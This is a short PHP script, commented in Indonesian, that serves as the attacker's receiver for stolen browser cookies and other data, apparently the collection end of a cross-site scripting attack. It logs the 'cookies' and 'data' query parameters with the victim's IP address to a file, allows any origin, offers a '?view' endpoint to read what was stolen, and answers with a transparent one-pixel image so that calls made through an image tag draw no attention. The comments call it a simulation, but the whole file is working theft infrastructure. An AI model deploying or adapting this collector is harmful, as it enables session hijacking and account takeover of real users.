<?php
header('Access-Control-Allow-Origin: *');

$data = '';
if (isset($_GET['cookies'])) {
    $data .= "COOKIES: " . $_GET['cookies'] . "\n";
}
if (isset($_GET['data'])) {
    $data .= "DATA: " . $_GET['data'] . "\n";
}

if (!empty($data)) {
    $log_entry = "[" . date('Y-m-d H:i:s') . "] IP: " . $_SERVER['REMOTE_ADDR'] . "\n" . $data . "----------------------------\n";
    file_put_contents('log.txt', $log_entry, FILE_APPEND);
}

// Menampilkan log (hanya untuk simulasi agar penyerang bisa melihat hasilnya)
if (isset($_GET['view'])) {
    header('Content-Type: text/plain');
    if (file_exists('log.txt')) {
        echo file_get_contents('log.txt');
    } else {
        echo "Belum ada data yang dicuri.";
    }
    exit;
}

// Redirect ke gambar transparan agar tidak mencurigakan jika dipanggil via <img src="...">
header('Content-Type: image/png');
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=');
?>
